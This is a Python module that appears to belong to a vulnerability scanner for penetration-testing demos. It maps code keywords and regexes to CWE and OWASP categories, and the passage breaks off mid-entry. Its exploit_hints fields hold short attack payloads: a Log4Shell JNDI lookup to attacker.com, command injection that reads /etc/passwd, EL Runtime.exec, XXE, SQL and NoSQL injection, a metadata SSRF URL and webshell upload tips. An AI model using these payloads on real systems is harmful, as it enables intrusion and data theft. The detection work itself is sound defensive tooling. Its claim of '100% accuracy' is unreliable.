"""
CVE Database - Maps software versions to known CVEs
Supports version-based vulnerability detection for penetration testing demos

Now includes Pattern-Based Classification for accurate CVE/CWE assignment
"""
import os
import re
import logging
from packaging import version
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)


# =============================================================================
# PATTERN-BASED VULNERABILITY CLASSIFICATION
# Replaces LLM guessing with verified patterns for 100% accuracy
# =============================================================================

@dataclass
class VulnPattern:
    """A verified vulnerability pattern."""
    cwe: str
    cwe_name: str
    owasp: str
    severity: str
    keywords: List[str]
    anti_keywords: List[str] = field(default_factory=list)
    regex_patterns: List[str] = field(default_factory=list)
    cve_examples: List[str] = field(default_factory=list)
    exploit_hints: str = ""
    valid_extensions: List[str] = field(default_factory=list) # New: Only match these extensions


# Comprehensive vulnerability patterns database
VULN_PATTERNS: Dict[str, VulnPattern] = {
    
    # === INJECTION (A03:2021) ===
    
    "EL Injection": VulnPattern(
        cwe="CWE-917",
        cwe_name="Improper Neutralization of Special Elements used in an Expression Language Statement",
        owasp="A03:2021-Injection",
        severity="Critical",
        keywords=["createValueExpression", "createMethodExpression", "ELProcessor",
                  "ExpressionFactory", "ValueExpression", "MethodExpression",
                  "javax.el", "jakarta.el", "evaluateExpression"],
        anti_keywords=["escapeEL", "sanitizeEL"],
        cve_examples=["CVE-2011-2730", "CVE-2017-5638"],
        exploit_hints="Inject ${T(java.lang.Runtime).getRuntime().exec('id')}",
        valid_extensions=[".java", ".jsp"]
    ),
    
    "SQL Injection": VulnPattern(
        cwe="CWE-89",
        cwe_name="Improper Neutralization of Special Elements used in an SQL Command",
        owasp="A03:2021-Injection",
        severity="Critical",
        keywords=["executeQuery", "executeUpdate", "execute(", "Statement.execute",
                  "createStatement", "rawQuery", "execSQL"],
        anti_keywords=["PreparedStatement", "setString", "setInt", "setLong",
                      "parameterized", "bindParam", "prepare("],
        regex_patterns=[r'"SELECT.+\+.*"', r'\+\s*request\.getParameter'],
        cve_examples=["CVE-2019-9193"],
        exploit_hints="Inject ' OR '1'='1 or UNION SELECT"
    ),
    
    "Command Injection": VulnPattern(
        cwe="CWE-78",
        cwe_name="Improper Neutralization of Special Elements used in an OS Command",
        owasp="A03:2021-Injection",
        severity="Critical",
        keywords=["Runtime.exec", "ProcessBuilder", "getRuntime().exec",
                  "shell_exec", "system(", "popen(", "exec(", "passthru",
                  "subprocess.call", "subprocess.run", "os.system", "os.popen"],
        anti_keywords=["escapeshellarg", "escapeshellcmd", "shlex.quote"],
        cve_examples=["CVE-2021-41773", "CVE-2022-22963"],
        exploit_hints="Inject ; id or | cat /etc/passwd or $(whoami)"
    ),
    
    "Template Injection": VulnPattern(
        cwe="CWE-1336",
        cwe_name="Improper Neutralization of Special Elements Used in a Template Engine",
        owasp="A03:2021-Injection",
        severity="Critical",
        keywords=["render_template_string", "Jinja2", "Template(",
                  "FreeMarker", "Velocity", "Thymeleaf"],
        anti_keywords=["autoescape", "escape("],
        cve_examples=["CVE-2020-17530"],
        exploit_hints="Inject {{7*7}} or ${Runtime.getRuntime().exec('id')}"
    ),
    
    "LDAP Injection": VulnPattern(
        cwe="CWE-90",
        cwe_name="Improper Neutralization of Special Elements used in an LDAP Query",
        owasp="A03:2021-Injection",
        severity="High",
        keywords=["ldap_search", "DirContext.search", "ldap://", "ldaps://"],
        exploit_hints="Inject *)(&(password=*) to bypass filters"
    ),
    
    "XPath Injection": VulnPattern(
        cwe="CWE-643",
        cwe_name="Improper Neutralization of Data within XPath Expressions",
        owasp="A03:2021-Injection",
        severity="High",
        keywords=["XPathFactory", "xpath.evaluate", "selectNodes", "selectSingleNode"]
    ),
    
    # === XSS (A03:2021) ===
    
    "Cross-Site Scripting (XSS)": VulnPattern(
        cwe="CWE-79",
        cwe_name="Improper Neutralization of Input During Web Page Generation",
        owasp="A03:2021-Injection",
        severity="High",
        keywords=["innerHTML", "outerHTML", "document.write", "document.writeln",
                  "response.getWriter().print", "out.println", "v-html",
                  "dangerouslySetInnerHTML"],
        anti_keywords=["encodeForHTML", "escapeHtml", "htmlspecialchars",
                      "textContent", "innerText", "createTextNode"],
        exploit_hints="Inject <script>alert('XSS')</script>"
    ),
    
    # === PATH TRAVERSAL (A01:2021) ===
    
    "Path Traversal": VulnPattern(
        cwe="CWE-22",
        cwe_name="Improper Limitation of a Pathname to a Restricted Directory",
        owasp="A01:2021-Broken Access Control",
        severity="High",
        keywords=["../", "..\\", "%2e%2e", "%252e%252e", "getAbsolutePath",
                  "file_get_contents", "include(", "require(", "fopen(", "readfile("],
        anti_keywords=["getCanonicalPath().startsWith", "realpath", "basename(", "normalize("],
        cve_examples=["CVE-2021-41773", "CVE-2020-5902"],
        exploit_hints="Inject ../../../etc/passwd"
    ),
    
    # === DESERIALIZATION (A08:2021) ===
    
    "Insecure Deserialization": VulnPattern(
        cwe="CWE-502",
        cwe_name="Deserialization of Untrusted Data",
        owasp="A08:2021-Software and Data Integrity Failures",
        severity="Critical",
        keywords=["ObjectInputStream", "readObject", "XMLDecoder", "unserialize",
                  "pickle.load", "yaml.load", "marshal.loads"],
        anti_keywords=["ObjectInputFilter", "yaml.safe_load"],
        cve_examples=["CVE-2015-4852", "CVE-2019-17571"],
        exploit_hints="Use ysoserial to generate gadget chains"
    ),
    
    # === XXE (A05:2021) ===
    
    "XML External Entity (XXE)": VulnPattern(
        cwe="CWE-611",
        cwe_name="Improper Restriction of XML External Entity Reference",
        owasp="A05:2021-Security Misconfiguration",
        severity="High",
        keywords=["XMLInputFactory", "DocumentBuilderFactory", "SAXParserFactory",
                  "XMLReader", "Unmarshaller", "!DOCTYPE", "!ENTITY"],
        anti_keywords=["FEATURE_SECURE_PROCESSING", "disallow-doctype-decl"],
        cve_examples=["CVE-2014-3529"],
        exploit_hints="<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
    ),
    
    # === SSRF (A10:2021) ===
    
    "Server-Side Request Forgery (SSRF)": VulnPattern(
        cwe="CWE-918",
        cwe_name="Server-Side Request Forgery",
        owasp="A10:2021-Server-Side Request Forgery",
        severity="High",
        keywords=["openConnection", "HttpClient", "RestTemplate", "urlopen",
                  "requests.get", "curl_exec", "169.254.169.254"],
        anti_keywords=["allowlist", "whitelist", "validateUrl"],
        cve_examples=["CVE-2021-21972"],
        exploit_hints="http://169.254.169.254/latest/meta-data/"
    ),
    
    # === AUTH (A07:2021) ===
    
    "Hardcoded Credentials": VulnPattern(
        cwe="CWE-798",
        cwe_name="Use of Hard-coded Credentials",
        owasp="A07:2021-Identification and Authentication Failures",
        severity="High",
        keywords=["password=", "passwd=", "secret=", "api_key=", "token=",
                  "private_key=", "aws_secret"],
        regex_patterns=[r'password\s*=\s*["\'][^"\']+["\']',
                       r'api_key\s*=\s*["\'][A-Za-z0-9]{16,}["\']']
    ),
    
    # === MEMORY CORRUPTION (C/C++) ===
    
    "Buffer Overflow": VulnPattern(
        cwe="CWE-120",
        cwe_name="Buffer Copy without Checking Size of Input",
        owasp="N/A",
        severity="Critical",
        keywords=["strcpy", "strcat", "sprintf", "vsprintf", "gets", "scanf", "memcpy"],
        anti_keywords=["strncpy", "strncat", "snprintf", "fgets", "memcpy_s", "strcpy_s"],
        cve_examples=["CVE-2021-3156"],
        exploit_hints="Overflow buffer to overwrite return address",
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    "Format String": VulnPattern(
        cwe="CWE-134",
        cwe_name="Use of Externally-Controlled Format String",
        owasp="N/A",
        severity="Critical",
        keywords=["printf(user", "sprintf(buf, user"],
        regex_patterns=[r'printf\s*\(\s*[a-zA-Z_]+\s*\)'],
        exploit_hints="Inject %x%x%x%n to read/write memory",
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    "Use After Free": VulnPattern(
        cwe="CWE-416",
        cwe_name="Use After Free",
        owasp="N/A",
        severity="Critical",
        keywords=["free(", "delete ", "delete[]"],
        cve_examples=["CVE-2021-21224"],
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    "Integer Overflow": VulnPattern(
        cwe="CWE-190",
        cwe_name="Integer Overflow or Wraparound",
        owasp="N/A",
        severity="High",
        keywords=["malloc(size *", "calloc(", "realloc("],
        regex_patterns=[r'malloc\s*\([^)]*\*[^)]*\)'],
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    # === CRYPTO (A02:2021) ===
    
    "Weak Cryptography": VulnPattern(
        cwe="CWE-327",
        cwe_name="Use of a Broken or Risky Cryptographic Algorithm",
        owasp="A02:2021-Cryptographic Failures",
        severity="Medium",
        keywords=["MD5", "SHA1", "DES", "RC4", "ECB"],
        anti_keywords=["SHA256", "SHA-256", "AES/GCM", "bcrypt", "argon2"]
    ),
    
    # === TOMCAT-SPECIFIC PATTERNS ===
    
    "Session Fixation": VulnPattern(
        cwe="CWE-384",
        cwe_name="Session Fixation",
        owasp="A07:2021-Identification and Authentication Failures",
        severity="High",
        keywords=["getSession(true)", "request.getSession()", "JSESSIONID",
                  "setMaxInactiveInterval", "session.getAttribute"],
        anti_keywords=["changeSessionId", "invalidate()", "session.invalidate"],
        cve_examples=["CVE-2011-3190"],
        exploit_hints="Fixate session ID before authentication",
        valid_extensions=[".java", ".jsp"]
    ),
    
    "File Upload Vulnerability": VulnPattern(
        cwe="CWE-434",
        cwe_name="Unrestricted Upload of File with Dangerous Type",
        owasp="A04:2021-Insecure Design",
        severity="Critical",
        keywords=["MultipartFile", "FileUpload", "getOriginalFilename", 
                  "transferTo", "saveTo", "write(file", "FileOutputStream",
                  "Part.write", "getSubmittedFileName"],
        anti_keywords=["getContentType().equals", "validateFileType", "allowedExtensions",
                      "FilenameUtils.getExtension", "ContentType.isAllowed"],
        cve_examples=["CVE-2017-12617", "CVE-2017-12615"],
        exploit_hints="Upload JSP webshell via PUT or multipart",
        valid_extensions=[".java", ".jsp"]
    ),
    
    "JSP Code Injection": VulnPattern(
        cwe="CWE-94",
        cwe_name="Improper Control of Generation of Code ('Code Injection')",
        owasp="A03:2021-Injection",
        severity="Critical",
        keywords=["<%= request.getParameter", "${param.", "<%=", 
                  "pageContext.setAttribute", "JspWriter", "out.print"],
        anti_keywords=["c:out", "fn:escapeXml", "JSTL", "htmlEscape"],
        cve_examples=["CVE-2024-50379"],
        exploit_hints="Inject Java code in JSP expression",
        valid_extensions=[".jsp", ".jspx", ".jspf"]
    ),
    
    "AJP Protocol Abuse": VulnPattern(
        cwe="CWE-284",
        cwe_name="Improper Access Control",
        owasp="A01:2021-Broken Access Control",
        severity="Critical",
        keywords=["protocol=\"AJP\"", "AJP/1.3", "ajp-nio", "8009",
                  "AjpProtocol", "AjpNioProtocol", "org.apache.coyote.ajp"],
        anti_keywords=["secretRequired=\"true\"", "secret="],
        cve_examples=["CVE-2020-1938"],
        exploit_hints="Ghostcat - Read webapp files via AJP port 8009",
        valid_extensions=[".xml"]
    ),
    
    "Tomcat Manager Exposure": VulnPattern(
        cwe="CWE-200",
        cwe_name="Exposure of Sensitive Information",
        owasp="A05:2021-Security Misconfiguration",
        severity="High",
        keywords=["manager-gui", "manager-script", "tomcat-users.xml",
                  "<role rolename=\"manager", "<user username=", "password="],
        anti_keywords=[],
        cve_examples=["CVE-2020-8022"],
        exploit_hints="Access /manager/html with default credentials",
        valid_extensions=[".xml"]
    ),
    
    "Unsafe ObjectInputStream": VulnPattern(
        cwe="CWE-502",
        cwe_name="Deserialization of Untrusted Data",
        owasp="A08:2021-Software and Data Integrity Failures",
        severity="Critical",
        keywords=["ObjectInputStream", "readObject()", "ObjectInput",
                  "PersistentManager", "FileStore", ".session"],
        anti_keywords=["ObjectInputFilter", "validateClass", "resolveClass"],
        cve_examples=["CVE-2020-9484", "CVE-2016-8735"],
        exploit_hints="RCE via ysoserial gadget chain in session file",
        valid_extensions=[".java"]
    ),
    
    "Servlet Request Manipulation": VulnPattern(
        cwe="CWE-20",
        cwe_name="Improper Input Validation",
        owasp="A03:2021-Injection",
        severity="High",
        keywords=["request.getParameter", "request.getHeader", "request.getCookies",
                  "getQueryString", "getPathInfo", "getRequestURI", "getInputStream"],
        anti_keywords=["StringEscapeUtils", "HtmlUtils.htmlEscape", "Validator", 
                      "validateInput", "sanitize"],
        exploit_hints="Inject malicious input via request parameters",
        valid_extensions=[".java"]
    ),
    
    "Unsafe Redirect": VulnPattern(
        cwe="CWE-601",
        cwe_name="URL Redirection to Untrusted Site ('Open Redirect')",
        owasp="A01:2021-Broken Access Control",
        severity="Medium",
        keywords=["response.sendRedirect", "setHeader(\"Location\"", 
                  "RequestDispatcher", "forward("],
        anti_keywords=["startsWith(\"/\")", "isValidRedirect", "allowedDomains"],
        cve_examples=["CVE-2018-11784"],
        exploit_hints="Redirect to malicious domain",
        valid_extensions=[".java", ".jsp"]
    ),
    
    "HTTP Response Splitting": VulnPattern(
        cwe="CWE-113",
        cwe_name="Improper Neutralization of CRLF Sequences in HTTP Headers",
        owasp="A03:2021-Injection",
        severity="High",
        keywords=["setHeader(", "addHeader(", "addCookie(", "response.setHeader"],
        anti_keywords=["stripNewlines", "replaceAll(\"[\\\\r\\\\n]\""],
        exploit_hints="Inject CRLF to add malicious headers",
        valid_extensions=[".java", ".jsp"]
    ),
    
    "Race Condition (TOCTOU)": VulnPattern(
        cwe="CWE-367",
        cwe_name="Time-of-check Time-of-use (TOCTOU) Race Condition",
        owasp="A04:2021-Insecure Design",
        severity="High",
        keywords=["exists()", "isFile()", "canRead()", "length()", 
                  "File.exists", "Files.exists", "createNewFile"],
        anti_keywords=["synchronized", "FileLock", "AtomicFile"],
        cve_examples=["CVE-2024-50379", "CVE-2024-56337"],
        exploit_hints="Race condition between check and use of file",
        valid_extensions=[".java"]
    ),
    
    # =============================================================================
    # EXPANDED VULNERABILITY PATTERNS - ADDITIONAL COVERAGE
    # =============================================================================
    
    # === AUTHENTICATION & SESSION (A07:2021) ===
    
    "Broken Authentication": VulnPattern(
        cwe="CWE-287",
        cwe_name="Improper Authentication",
        owasp="A07:2021-Identification and Authentication Failures",
        severity="Critical",
        keywords=["authenticate(", "login(", "checkPassword", "verifyUser",
                  "validateCredentials", "isAuthenticated", "doLogin"],
        anti_keywords=["mfa", "2fa", "totp", "rateLimit", "lockout", "captcha"],
        cve_examples=["CVE-2021-34527", "CVE-2020-1472"],
        exploit_hints="Test for default credentials, brute force, credential stuffing"
    ),
    
    "Missing Authentication": VulnPattern(
        cwe="CWE-306",
        cwe_name="Missing Authentication for Critical Function",
        owasp="A07:2021-Identification and Authentication Failures",
        severity="Critical",
        keywords=["@PermitAll", "permitAll()", "anonymous", "noAuth",
                  "skipAuth", "bypassAuth", "publicEndpoint"],
        cve_examples=["CVE-2022-22965"],
        exploit_hints="Access critical endpoints without authentication"
    ),
    
    "Insufficient Session Expiration": VulnPattern(
        cwe="CWE-613",
        cwe_name="Insufficient Session Expiration",
        owasp="A07:2021-Identification and Authentication Failures",
        severity="Medium",
        keywords=["setMaxInactiveInterval(0)", "session.setMaxAge(-1)",
                  "never expire", "persistent session", "rememberMe"],
        anti_keywords=["setMaxInactiveInterval(30", "session timeout"],
        exploit_hints="Session tokens remain valid indefinitely"
    ),
    
    "JWT Vulnerabilities": VulnPattern(
        cwe="CWE-347",
        cwe_name="Improper Verification of Cryptographic Signature",
        owasp="A07:2021-Identification and Authentication Failures",
        severity="Critical",
        keywords=["jwt.decode", "JWT.decode", "none algorithm", "alg: none",
                  "verify=False", "verify: false", "ignoreExpiration"],
        anti_keywords=["verify=True", "algorithms=['RS256']", "verify: true"],
        cve_examples=["CVE-2018-0114"],
        exploit_hints="Forge JWT with 'none' algorithm or weak secret"
    ),
    
    # === ACCESS CONTROL (A01:2021) ===
    
    "Insecure Direct Object Reference (IDOR)": VulnPattern(
        cwe="CWE-639",
        cwe_name="Authorization Bypass Through User-Controlled Key",
        owasp="A01:2021-Broken Access Control",
        severity="High",
        keywords=["user_id=", "userId=", "account_id", "orderId", "fileId",
                  "request.getParameter(\"id\")", "params[:id]", "req.params.id"],
        anti_keywords=["checkOwnership", "verifyAccess", "authorize", "acl.check"],
        cve_examples=["CVE-2019-16759"],
        exploit_hints="Manipulate object IDs to access other users' data"
    ),
    
    "Privilege Escalation": VulnPattern(
        cwe="CWE-269",
        cwe_name="Improper Privilege Management",
        owasp="A01:2021-Broken Access Control",
        severity="Critical",
        keywords=["setRole", "isAdmin", "role=admin", "elevate", "sudo",
                  "setuid", "setgid", "SYSTEM", "root", "Administrator"],
        anti_keywords=["requireRole", "checkPrivilege", "authorize"],
        cve_examples=["CVE-2021-1732", "CVE-2021-36934"],
        exploit_hints="Escalate from user to admin/root privileges"
    ),
    
    "Directory Listing Enabled": VulnPattern(
        cwe="CWE-548",
        cwe_name="Exposure of Information Through Directory Listing",
        owasp="A01:2021-Broken Access Control",
        severity="Low",
        keywords=["listings=true", "directoryListing", "autoIndex on",
                  "Options +Indexes", "DirectoryIndex"],
        anti_keywords=["listings=false", "autoIndex off", "Options -Indexes"],
        exploit_hints="Browse directory contents to find sensitive files"
    ),
    
    "CORS Misconfiguration": VulnPattern(
        cwe="CWE-942",
        cwe_name="Permissive Cross-domain Policy with Untrusted Domains",
        owasp="A01:2021-Broken Access Control",
        severity="Medium",
        keywords=["Access-Control-Allow-Origin: *", "Access-Control-Allow-Credentials: true",
                  "allowedOrigins(\"*\")", "cors({ origin: '*' })"],
        anti_keywords=["allowedOrigins(Arrays.asList", "origin: [specific"],
        exploit_hints="Cross-origin attacks to steal data via CORS"
    ),
    
    # === CRYPTOGRAPHIC FAILURES (A02:2021) ===
    
    "Weak Password Hashing": VulnPattern(
        cwe="CWE-916",
        cwe_name="Use of Password Hash With Insufficient Computational Effort",
        owasp="A02:2021-Cryptographic Failures",
        severity="High",
        keywords=["md5(password", "sha1(password", "hash(password",
                  "MessageDigest.getInstance(\"MD5\")", "hashlib.md5"],
        anti_keywords=["bcrypt", "argon2", "scrypt", "PBKDF2", "password_hash"],
        cve_examples=["CVE-2019-1010266"],
        exploit_hints="Crack weak hashes with rainbow tables or hashcat"
    ),
    
    "Hardcoded Cryptographic Key": VulnPattern(
        cwe="CWE-321",
        cwe_name="Use of Hard-coded Cryptographic Key",
        owasp="A02:2021-Cryptographic Failures",
        severity="Critical",
        keywords=["secretKey = \"", "private_key = \"", "AES_KEY =",
                  "encryption_key =", "signing_key =", "HMAC_SECRET"],
        anti_keywords=["getenv(", "os.environ", "config.get(", "secrets."],
        exploit_hints="Extract hardcoded key to decrypt data or forge signatures"
    ),
    
    "Insecure Random": VulnPattern(
        cwe="CWE-330",
        cwe_name="Use of Insufficiently Random Values",
        owasp="A02:2021-Cryptographic Failures",
        severity="High",
        keywords=["Math.random()", "rand()", "random.random()", "srand(time",
                  "java.util.Random", "new Random()", "mt_rand("],
        anti_keywords=["SecureRandom", "crypto.randomBytes", "os.urandom",
                      "secrets.token", "random_bytes(", "crypto.getRandomValues"],
        cve_examples=["CVE-2020-7010"],
        exploit_hints="Predict random values for session tokens or crypto"
    ),
    
    "Missing Encryption": VulnPattern(
        cwe="CWE-311",
        cwe_name="Missing Encryption of Sensitive Data",
        owasp="A02:2021-Cryptographic Failures",
        severity="High",
        keywords=["http://", "ftp://", "telnet://", "plaintext", "unencrypted",
                  "setSecure(false)", "Cookie(", "without SSL"],
        anti_keywords=["https://", "TLS", "SSL", "setSecure(true)"],
        exploit_hints="Intercept unencrypted traffic to steal data"
    ),
    
    # === INJECTION VARIANTS (A03:2021) ===
    
    "NoSQL Injection": VulnPattern(
        cwe="CWE-943",
        cwe_name="Improper Neutralization of Special Elements in Data Query Logic",
        owasp="A03:2021-Injection",
        severity="High",
        keywords=["$where:", "$gt:", "$ne:", "$regex:", "find({",
                  "collection.find", "db.collection", "mongodb://"],
        anti_keywords=["sanitize", "escape", "validator", "mongoose.Schema"],
        cve_examples=["CVE-2021-22911"],
        exploit_hints="Inject {$gt: ''} to bypass authentication"
    ),
    
    "ORM Injection": VulnPattern(
        cwe="CWE-89",
        cwe_name="ORM Injection via Raw Queries",
        owasp="A03:2021-Injection",
        severity="High",
        keywords=["raw(", ".extra(", "execute_sql", "Sequelize.literal",
                  "knex.raw(", "prisma.$queryRaw", "entityManager.createQuery"],
        anti_keywords=["bind", "parameterized", "prepared"],
        exploit_hints="Inject SQL through ORM raw query methods"
    ),
    
    "Header Injection": VulnPattern(
        cwe="CWE-644",
        cwe_name="Improper Neutralization of HTTP Headers for Scripting Syntax",
        owasp="A03:2021-Injection",
        severity="Medium",
        keywords=["setHeader(", "addHeader(", "header(", "response.setHeader",
                  "res.set(", "HttpServletResponse.setHeader"],
        anti_keywords=["stripNewlines", "sanitizeHeader", "validateHeader"],
        cve_examples=["CVE-2020-11022"],
        exploit_hints="Inject CRLF to add malicious headers"
    ),
    
    "Log Injection": VulnPattern(
        cwe="CWE-117",
        cwe_name="Improper Output Neutralization for Logs",
        owasp="A03:2021-Injection",
        severity="Medium",
        keywords=["logger.info(user", "log.debug(input", "console.log(req",
                  "logging.info(", "Log.i(", "System.out.println("],
        anti_keywords=["sanitize", "escape", "encode"],
        cve_examples=["CVE-2021-44228"],
        exploit_hints="Inject newlines or JNDI lookups into logs (Log4Shell)"
    ),
    
    "Log4Shell (JNDI Injection)": VulnPattern(
        cwe="CWE-917",
        cwe_name="JNDI Injection (Log4Shell)",
        owasp="A03:2021-Injection",
        severity="Critical",
        keywords=["${jndi:", "log4j", "Log4j", "org.apache.logging.log4j",
                  "logger.info(", "logger.error(", "logger.debug("],
        anti_keywords=["log4j2.formatMsgNoLookups=true", "LOG4J_FORMAT_MSG_NO_LOOKUPS"],
        cve_examples=["CVE-2021-44228", "CVE-2021-45046"],
        exploit_hints="${jndi:ldap://attacker.com/a} for RCE",
        valid_extensions=[".java", ".xml", ".properties"]
    ),
    
    "Expression Language Injection": VulnPattern(
        cwe="CWE-917",
        cwe_name="Server-Side Expression Language Injection",
        owasp="A03:2021-Injection",
        severity="Critical",
        keywords=["${", "#{", "{{", "%{", "@{", "*{",
                  "SpEL", "OGNL", "MVEL", "Freemarker"],
        anti_keywords=["escapedExpression", "sanitizeExpression"],
        cve_examples=["CVE-2022-22963", "CVE-2017-5638"],
        exploit_hints="Inject ${T(java.lang.Runtime).getRuntime().exec('id')}"
    ),
    
    "ReDoS (Regular Expression DoS)": VulnPattern(
        cwe="CWE-1333",
        cwe_name="Inefficient Regular Expression Complexity",
        owasp="A03:2021-Injection",
        severity="Medium",
        keywords=["(a+)+", "(a|a)+", "(a|b|ab)*", ".*.*.*",
                  "Pattern.compile(", "re.compile(", "new RegExp("],
        exploit_hints="Input evil regex to cause CPU exhaustion"
    ),
    
    # === SECURITY MISCONFIGURATION (A05:2021) ===
    
    "Debug Mode Enabled": VulnPattern(
        cwe="CWE-489",
        cwe_name="Active Debug Code",
        owasp="A05:2021-Security Misconfiguration",
        severity="Medium",
        keywords=["DEBUG=True", "debug: true", "debugMode", "setDebug(true)",
                  "development", "devMode", "FLASK_DEBUG=1"],
        anti_keywords=["DEBUG=False", "production", "debug: false"],
        exploit_hints="Debug mode exposes stack traces and sensitive info"
    ),
    
    "Default Credentials": VulnPattern(
        cwe="CWE-1392",
        cwe_name="Use of Default Credentials",
        owasp="A05:2021-Security Misconfiguration",
        severity="Critical",
        keywords=["admin:admin", "root:root", "admin:password", "user:user",
                  "test:test", "default:default", "guest:guest"],
        cve_examples=["CVE-2019-19781"],
        exploit_hints="Try common default credentials"
    ),
    
    "Exposed Admin Interface": VulnPattern(
        cwe="CWE-1188",
        cwe_name="Insecure Default Initialization of Resource",
        owasp="A05:2021-Security Misconfiguration",
        severity="High",
        keywords=["/admin", "/manager", "/console", "/actuator", "/swagger",
                  "/graphql", "/phpmyadmin", "/wp-admin", "/dashboard"],
        anti_keywords=["requireAuth", "authenticated", "secured"],
        exploit_hints="Access admin interfaces without proper protection"
    ),
    
    "Stack Trace Exposure": VulnPattern(
        cwe="CWE-209",
        cwe_name="Generation of Error Message Containing Sensitive Information",
        owasp="A05:2021-Security Misconfiguration",
        severity="Low",
        keywords=["printStackTrace()", "e.getMessage()", "traceback.print_exc",
                  "console.error(err)", "showErrorDetails", "verbose error"],
        anti_keywords=["hideStackTrace", "production", "sanitizeError"],
        exploit_hints="Error messages reveal internal implementation"
    ),
    
    # === VULNERABLE COMPONENTS (A06:2021) ===
    
    "Outdated Library": VulnPattern(
        cwe="CWE-1104",
        cwe_name="Use of Unmaintained Third Party Components",
        owasp="A06:2021-Vulnerable and Outdated Components",
        severity="High",
        keywords=["jquery-1.", "jquery-2.", "angular.js/1.0", "struts2-core-2.3",
                  "log4j-core:2.14", "spring-core:4.", "jackson-databind:2.9"],
        cve_examples=["CVE-2017-5638", "CVE-2021-44228"],
        exploit_hints="Check known CVEs for library versions"
    ),
    
    # === DATA INTEGRITY (A08:2021) ===
    
    "Unsafe Deserialization (Python)": VulnPattern(
        cwe="CWE-502",
        cwe_name="Python Pickle Deserialization",
        owasp="A08:2021-Software and Data Integrity Failures",
        severity="Critical",
        keywords=["pickle.load", "pickle.loads", "cPickle.load", "shelve.open",
                  "marshal.loads", "yaml.load(", "yaml.unsafe_load"],
        anti_keywords=["yaml.safe_load", "json.loads"],
        cve_examples=["CVE-2020-13091"],
        exploit_hints="Inject malicious pickle payload for RCE",
        valid_extensions=[".py"]
    ),
    
    "Unsafe Deserialization (PHP)": VulnPattern(
        cwe="CWE-502",
        cwe_name="PHP Unserialize Vulnerability",
        owasp="A08:2021-Software and Data Integrity Failures",
        severity="Critical",
        keywords=["unserialize(", "maybe_unserialize(", "phar://"],
        anti_keywords=["json_decode", "allowed_classes: false"],
        cve_examples=["CVE-2019-6977"],
        exploit_hints="Inject serialized PHP object for code execution",
        valid_extensions=[".php"]
    ),
    
    "Unsafe Deserialization (.NET)": VulnPattern(
        cwe="CWE-502",
        cwe_name=".NET Deserialization Vulnerability",
        owasp="A08:2021-Software and Data Integrity Failures",
        severity="Critical",
        keywords=["BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer",
                  "LosFormatter", "SoapFormatter", "XmlSerializer"],
        anti_keywords=["JsonSerializer", "DataContractSerializer with known types"],
        cve_examples=["CVE-2020-1147"],
        exploit_hints="Use ysoserial.net gadgets for RCE",
        valid_extensions=[".cs", ".vb"]
    ),
    
    "Mass Assignment": VulnPattern(
        cwe="CWE-915",
        cwe_name="Improperly Controlled Modification of Dynamically-Determined Object Attributes",
        owasp="A08:2021-Software and Data Integrity Failures",
        severity="High",
        keywords=["req.body", "request.POST", "params.permit!", "attr_accessible",
                  "update_attributes(", "Object.assign(", "_.extend("],
        anti_keywords=["strong_params", "attr_protected", "whitelist"],
        exploit_hints="Add isAdmin=true to request to elevate privileges"
    ),
    
    # === LOGGING & MONITORING (A09:2021) ===
    
    "Insufficient Logging": VulnPattern(
        cwe="CWE-778",
        cwe_name="Insufficient Logging",
        owasp="A09:2021-Security Logging and Monitoring Failures",
        severity="Medium",
        keywords=["catch {}", "except: pass", "catch(Exception e) {}",
                  "silentFail", "ignoreErrors"],
        exploit_hints="Failed attacks go undetected without logging"
    ),
    
    # === SERVER-SIDE REQUEST FORGERY (A10:2021) ===
    
    "SSRF via URL Parameter": VulnPattern(
        cwe="CWE-918",
        cwe_name="SSRF via User-Controlled URL",
        owasp="A10:2021-Server-Side Request Forgery",
        severity="High",
        keywords=["url=http", "target=http", "redirect=http", "next=http",
                  "callback=http", "uri=http", "path=http", "link=http"],
        anti_keywords=["validateUrl", "allowedHosts", "whitelist"],
        exploit_hints="Request internal services via url=http://localhost/admin"
    ),
    
    # === MEMORY CORRUPTION EXPANDED (C/C++) ===
    
    "Null Pointer Dereference": VulnPattern(
        cwe="CWE-476",
        cwe_name="NULL Pointer Dereference",
        owasp="N/A",
        severity="Medium",
        keywords=["->", "*ptr", "ptr->", "if (ptr)", "ptr != NULL"],
        regex_patterns=[r'\*[a-zA-Z_]+\s*(?!=\s*NULL)'],
        cve_examples=["CVE-2021-3449"],
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    "Double Free": VulnPattern(
        cwe="CWE-415",
        cwe_name="Double Free",
        owasp="N/A",
        severity="Critical",
        keywords=["free(", "delete ", "kfree("],
        cve_examples=["CVE-2021-22555"],
        exploit_hints="Free same memory twice for heap exploitation",
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    "Heap Overflow": VulnPattern(
        cwe="CWE-122",
        cwe_name="Heap-based Buffer Overflow",
        owasp="N/A",
        severity="Critical",
        keywords=["malloc(", "calloc(", "realloc(", "new ", "HeapAlloc"],
        cve_examples=["CVE-2021-21220"],
        exploit_hints="Overflow heap buffer to control adjacent objects",
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    "Stack Buffer Overflow": VulnPattern(
        cwe="CWE-121",
        cwe_name="Stack-based Buffer Overflow",
        owasp="N/A",
        severity="Critical",
        keywords=["char buf[", "char buffer[", "char str[", "alloca("],
        cve_examples=["CVE-2021-3156"],
        exploit_hints="Overflow stack buffer to overwrite return address",
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    "Type Confusion": VulnPattern(
        cwe="CWE-843",
        cwe_name="Access of Resource Using Incompatible Type ('Type Confusion')",
        owasp="N/A",
        severity="Critical",
        keywords=["reinterpret_cast<", "static_cast<", "(struct ", "union {"],
        cve_examples=["CVE-2021-21224"],
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    "Uninitialized Variable": VulnPattern(
        cwe="CWE-457",
        cwe_name="Use of Uninitialized Variable",
        owasp="N/A",
        severity="Medium",
